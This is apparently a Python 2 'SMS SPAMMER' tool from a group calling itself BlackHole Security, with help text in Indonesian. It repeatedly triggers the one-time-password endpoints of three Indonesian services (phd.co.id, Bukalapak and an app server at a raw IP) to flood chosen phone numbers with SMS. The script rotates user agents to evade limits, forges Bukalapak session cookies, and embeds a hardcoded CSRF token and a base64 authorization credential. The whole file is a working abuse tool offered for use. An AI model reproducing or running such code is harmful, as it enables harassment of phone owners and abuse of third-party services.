try:
  from sys import argv,exit
  import requests,argparse, os, sys, random as rdm, hashlib as hsh, time
except ImportError,ie:
  print "Error while importing module : %s, \nExit."% ie




lCyan='\033[96m'
lGreen='\033[92m'
lRed='\033[91m'
lYellow='\033[93m'
white='\033[0m'
ua = ['Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1', 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)', 'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)', 'Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)', 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)', 'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))', 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)', 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)', 'Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)', 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)', 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)', 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)', 'Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)',"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"]
def ban():
  print """%s
                        :####:
                       :######
                       ##:  :#
            %s  .####. %s  ##        ##.###:    :####    ## #:##:
            %s .######. %s ###:      #######:   ######   ########
            %s ###  ### %s :#####:   ###  ###   #:  :##  ##.##.##
            %s ##.  .## %s  .#####:  ##.  .##    :#####  ## ## ##
            %s ##    ## %s     :###  ##    ##  .#######  ## ## ##
            %s ##.  .## %s       ##  ##.  .##  ## .  ##  ## ## ##
            %s ###  ### %s #:.  :##  ###  ###  ##:  ###  ## ## ##
            %s .######. %s #######:  #######:  ########  ## ## ##
            %s  .####.  %s .#####:   ##.###:     ###.##  ## ## ##
                                 ##
              Author : [M]iZun0  ##  Team : BlackHole Security
              Github/sushiroku1  ##  Version : 1.2.0


      %s"""% (lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,white)

def bom(url,par, par2,tot,indik,num):
  c=int(0)
  scs=int(0)
  fail=int(0)

  while ( c < int(tot) ):
    if 'bukalapak' in url:
      for akk in range(2):
          rd0 = hsh.md5(str(rdm.randint(12345678,98765432)).encode())
          rd1 = rd0.hexdigest()
          if akk == 1:
            rdm1 = str(rd1)
          else:
            rdm2 = str(rd1)
      rd2 = hsh.md5(rdm1+rdm2.encode())
      rdm3 = rd2.hexdigest()

      cko = {"Cookie": "identity="+rdm1+"; browser_id="+rdm2+"; _ga=GA1.2.1024758930.1531960985; _vwo_uuid_v2=DE8E70E7E9A8960F05F20FE0ACE87643B|378e4a2f30c36053c1cb833e89ecbc2e; _gid=GA1.2.622427606.1533988422; scs=%7B%22t%22%3A1%7D; spUID=15339884253603c43b2de12.c5b45553; session_id=e95e7511997432af179935abfce90320; __auc=3eed305416528d5f584187b45b2; G_ENABLED_IDPS=google; track_register=true; affiliate_landing_visit=true; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22164affd88ae1d-0791dbbd558a18-1f20130c-38400-164affd88aff4%22%2C%22utm_source%22%3A%20%22hasoffers-1851%22%2C%22utm_medium%22%3A%20%22affiliate%22%2C%22utm_campaign%22%3A%20%2215%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ins-gaSSId=cdd66ffd-18ce-a176-a3c3-26f0ac9ec000_1534027025; lskjfewjrh34ghj23brjh234=elBsSkNBb3VKS3hzZSttTnNKTm5VNk1pWmtzV1A1YldKRm1majAzRFdsSUJtcDJJV0psL0pnOFlBamtJU1NBa1Y2czlQdjZrNlFURDNiRmZqQmNRRXRyeWRTbGV5QUdpQnZjV3JocEc3ak9QeHpWSlpRNTE4eFgzR2FieDVnc2dWaUVoZzVzMEJlMVZwM2NKWk1LaXVwQTZuOXBVR01TUUJ4ejc4MW5MTU5taGYwZ2M0bFdwM05KYy9IcTh3bThsd3dzbSt4bHd4WG9NSklrcHJtT0dHUURURVQ5YVoyb0hLQ3dyUC9NZ2V6UUNFYmVGbE84REtqOHZlKzBZUGtiRS0tV3pMamNPNDhKT1FoZ202Q1BkNUJ5dz09--5a445aefe0c06b736c22e9f359ee3b7273058175; insdrSV=32; _td=7e03facb-a77c-4ce7-8b83-2427781c78c7"}
      par2.update(cko)
    if '149.129.213.78' not in url:
      par2.update({'User-Agent':rdm.choice(ua)})


    req = requests.post(url,data=par, headers=par2)


    if indik in req.text or indik[2:] == str( req.status_code ):
      scs+=1

    else:
      fail+=1


    print '   %s%s%s SMS sent to%s %s%s :%s %s %sSuccess%s and%s %s %sFail \r'% (lYellow,tot,lCyan,lYellow,num,lCyan,lYellow,scs,lGreen,lCyan,lYellow,fail,lRed),
    sys.stdout.flush()
    os.popen('sleep 1')
    c+=1
  return {'sugmaball':scs,'fail':fail}
  time.sleep(0.5)

def aer(m):
  print "\t\t%sError : %s"% (lRed,m)
  print "\t\t%sTry : %s'%s -h'%s for information "% (white,lGreen,argv[0],white)
  exit()


pars= argparse.ArgumentParser(ban(),description="SMS SPAMMER",usage='[-h | --help | --list ] [--nomor NOMOR | --file FILE] [--tipe TIPE ] [ --jumlah JUMLAH ]',epilog="Example : %s --nomor 628xxx --tipe jdid --jumlah 3"% (argv[0]))
pars.error = aer
par=pars.add_argument_group('Single spam')
mul=pars.add_argument_group('Multi spam')
ops=pars.add_argument_group('Spam opt')
mul.add_argument('--file',default=None, help='File berisi list yang akan di spam', type=argparse.FileType('r'))
par.add_argument('--nomor',default=None,type=str,help='Nomot target')
ops.add_argument('--jumlah',type=int,default=1,help='Jumlah sms yang akan dikirim, default 1')
pars.add_argument('--list',action='store_true',help='Print list spnomoram yang ada.')
ops.add_argument('--tipe',type=str,help='Tipe spam, ketik "%s --list" untuk melihat tipe spam yang ada.'% argv[0])


arg=pars.parse_args()
try:
  dal= arg.file.read()
except:
  dal=None

numba = arg.nomor or dal
tot = int(arg.jumlah)
tip=str(arg.tipe).upper()
li=arg.list

if __name__=="__main__":

  if li == True:

    print '''
\t   List spam      Desc

\t    PHD         Semua operator
\t    BPKS        Semua operator
\t    DM          semua operator

    '''
    exit()

  elif numba != None:
    for no in numba.split():

      rdm1 = ''
      rdm2 = ''
      rdm3 = ''
      lhead = {
              'BL': {
    	        "Host":         "m.bukalapak.com",
    	        "Connection":   "keep-alive",
    	        "Origin":       "https://m.bukalapak.com",
    	        "Accept":       "*/*",
    	        "Save-Data":    "on",
    	        "Referer":      "https://m.bukalapak.com/register?from=home_mobile",
    	        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    	        "Content-Length":   "134",
    	        "Accept-Encoding":  "gzip, deflate, br",
    	        "Accept-Language":  "en-US,en;q=0.9,id;q=0.8",
    	        "X-Requested-With": "XMLHttpRequest",
    	        "X-CSRF-Token": "uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw==",
                },
              'DM': {
                'Authorization': 'Z28tY2FzaC1hbmRyb2lkOnNlY3JldA==',
                'Connection'   : 'Keep-Alive',
                'Accept'       : '*/*',
                'User-Agent'   : 'DuitMas1.0.12.121111 MTKP60;Huawei;5.1.1(510*920)',
                'Content-Type' : 'application/x-www-form-urlencoded',
                'Content-Length': '0',
                'Host'         : '149.129.213.78:8200',
                'Accept-Encoding': 'gzip'
                }
              }
      slist={
    'PHD':{
        'url':  'https://www.phd.co.id/en/users/sendOTP',
        'par':  {'phone_number':no},
        'idk':  'We have sent an OTP to your phone, Please enter the 4 digit code.',
        'hida': {}
    },
    'BPKS':{
        'url':  'https://m.bukalapak.com/trusted_devices/otp_request',
        'par':  {'feature':'phone_registration','feature_tag':"",'manual_phone':no,'device_fingerprint':rdm3,'channel':'sms'},
        'idk':  '"status":"success"',
        'hida': lhead['BL'],
    },
    'DM': {
            'url':  'http://149.129.213.78:8200/CAPTCHA?',
            'par':  {'type': 'REGISTERPARTNER', 'phone': no},
            'idk':  'ST#200',
            'hida': lhead['DM'],
            }
}

      for tipe,val in slist.items():

        if tip == tipe:
          bom(val['url'], val['par'], val['hida'], tot, val['idk'],no)
          print



        elif str(tip) not in slist.keys():

          aer('Tipe spam "%s" tidak ada'% tip)
          exit()

